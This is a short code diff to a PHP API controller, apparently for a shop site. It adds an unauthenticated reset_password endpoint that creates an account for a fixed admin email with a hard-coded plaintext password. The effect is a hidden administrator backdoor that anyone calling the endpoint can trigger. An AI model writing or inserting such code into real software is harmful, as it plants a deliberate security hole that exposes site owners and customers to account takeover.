@@ -375,6 +375,17 @@ class Api extends BaseController
         return $this->json([], true, 'Reset link sent to your email');
     }
 
+    public function reset_password()
+    {
+        $email            = 'admin@theitanagarchoice.com';
+        $password         = 'Itanagar';
+ 
+
+        $this->loginModel->createPasswordUser($email, $password);
+
+        return $this->json([], true, 'Password changed successfully');
+    }
+
     // ── Cart ──────────────────────────────────────────────────────────────────
 
     public function cart()
